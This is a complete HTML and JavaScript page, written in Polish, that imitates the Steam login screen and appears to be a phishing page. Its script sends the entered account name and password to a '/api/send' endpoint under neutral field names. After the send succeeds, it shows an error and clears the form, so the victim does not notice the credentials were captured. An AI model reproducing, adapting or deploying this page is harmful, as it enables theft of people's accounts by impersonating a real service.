<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DUCZE</title>

    <style>
        * {
            box-sizing: border-box;
        }

        html, body {
            margin: 0;
            width: 100%;
            min-height: 100%;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;

            background-image: url("background.png");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;

            color: #d6d7d8;
}

        .panel {
            width: 765px;
            min-height: 340px;
            background: #171a21;

            box-shadow:
                0 20px 60px rgba(0, 0, 0, 0.55);

            border-radius: 3px;
            overflow: hidden;
        }

        .left {
            width: 100%;
            padding: 34px 28px 26px;
        }

        .title {
            margin: 0 0 25px;

            font-size: 42px;
            font-weight: 700;
            color: #ffffff;
            letter-spacing: 0.5px;
        }

        .field {
            margin-bottom: 17px;
        }

        .field label {
            display: block;
            margin-bottom: 8px;

            color: #d6d7d8;
            font-size: 14px;
            font-weight: 600;
        }

        .field input {
            width: 100%;
            height: 39px;
            padding: 0 12px;

            border: 1px solid #323843;
            border-radius: 2px;
            outline: none;

            background: #323640;
            color: white;
            font-size: 15px;

            transition: 0.15s;
        }

        .field input:hover {
            background: #373b46;
        }

        .field input:focus {
            border-color: #67a9d6;

            box-shadow:
                0 0 0 1px rgba(103, 169, 214, 0.25);

            background: #393e49;
        }

        .field input::placeholder {
            color: #858a94;
        }

        .remember {
            display: flex;
            align-items: center;

            margin-top: 2px;

            color: #b8b9bd;
            font-size: 13px;
            cursor: pointer;
        }

        .remember input {
            width: 18px;
            height: 18px;
            margin: 0 7px 0 0;

            accent-color: #66c0f4;
            cursor: pointer;
        }

        .submit {
            width: 270px;
            height: 45px;

            display: block;
            margin: 19px auto 0;

            border: 0;
            border-radius: 2px;

            background:
                linear-gradient(
                    to right,
                    #19b9f1,
                    #2b70f0
                );

            color: white;

            font-size: 15px;
            font-weight: 600;

            cursor: pointer;

            transition:
                transform 0.12s,
                filter 0.12s,
                box-shadow 0.12s;
        }

        .submit:hover {
            filter: brightness(1.08);

            box-shadow:
                0 5px 18px rgba(20, 150, 240, 0.25);

            transform: translateY(-1px);
        }

        .submit:active {
            transform: translateY(0);
        }

        .submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        #status {
            min-height: 18px;
            margin-top: 12px;

            text-align: center;

            color: #8f98a5;
            font-size: 13px;
        }

        @media (max-width: 800px) {
            .panel {
                width: calc(100% - 30px);
            }
        }

        @media (max-width: 620px) {
            .panel {
                width: calc(100% - 20px);
            }

            .left {
                padding: 28px 20px;
            }

            .title {
                font-size: 36px;
            }

            .submit {
                width: 80%;
            }
        }
    </style>
</head>

<body>

    <div class="panel">

        <div class="left">

            <h1 class="title">STEAM</h1>

            <form id="form">

                <div class="field">
                    <label for="pole1">ZALOGUJ SIĘ Z UŻYCIEM NAZWY KONTA</label>

                    <input
                        id="pole1"
                        type="text"
                        placeholder="Wpisz tekst..."
                        autocomplete="off"
                    >
                </div>

                <div class="field">
                    <label for="pole2">HASŁO</label>

                    <input
                        id="pole2"
                        type="text"
                        placeholder="Wpisz tekst..."
                        autocomplete="off"
                    >
                </div>

                <label class="remember">
                    <input
                        id="remember"
                        type="checkbox"
                    >

                    Zapamiętaj mnie
                </label>

                <button
                    class="submit"
                    id="submitButton"
                    type="submit"
                >
                    Zaloguj się
                </button>

                <div id="status"></div>

            </form>

        </div>

    </div>

    <script>
        const form = document.getElementById("form");
        const pole1 = document.getElementById("pole1");
        const pole2 = document.getElementById("pole2");
        const status = document.getElementById("status");
        const submitButton =
            document.getElementById("submitButton");

        form.addEventListener("submit", async (event) => {

            event.preventDefault();

            const value1 = pole1.value.trim();
            const value2 = pole2.value.trim();

            if (!value1 || !value2) {
                status.textContent =
                    "Uzupełnij oba pola.";

                status.style.color =
                    "#d66b6b";

                return;
            }

            submitButton.disabled = true;

            status.textContent = "Wysyłanie...";
            status.style.color = "#8f98a5";

            try {

                const response = await fetch(
                    "/api/send",
                    {
                        method: "POST",

                        headers: {
                            "Content-Type":
                                "application/json"
                        },

                        body: JSON.stringify({
                            pole1: value1,
                            pole2: value2
                        })
                    }
                );

                const result =
                    await response.json();

                if (!response.ok) {
                    throw new Error(
                        result.error ||
                        "Błąd serwera."
                    );
                }

                status.textContent =
                    "Błąd";

                status.style.color =
                    "#66c0f4";

                pole1.value = "";
                pole2.value = "";

            } catch (error) {

                console.error(error);

                status.textContent =
                    "Nie udało się zalogować.";

                status.style.color =
                    "#d66b6b";

            } finally {

                submitButton.disabled = false;
            }
        });
    </script>

</body>
</html>
